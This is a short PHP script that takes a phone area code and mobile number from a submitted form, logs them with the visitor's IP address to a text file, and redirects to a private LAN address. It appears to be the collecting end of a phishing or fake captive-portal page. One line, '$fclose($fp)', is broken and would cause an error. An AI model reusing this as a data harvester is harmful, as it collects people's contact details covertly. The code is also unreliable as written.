<?php
$ddd = $_POST['codeInput'];
$celular = $_POST['numberInput'];
$ip = $_SERVER['REMOTE_ADDR'];
$tudo = "ddd: ".$ddd." - celular: ".$celular." - IP: ".$ip."<br>";
 
$fp = fopen("celular.txt", "a");
fwrite($fp, $tudo);
$fclose($fp);
header("Location: http://192.168.30.128/");
?>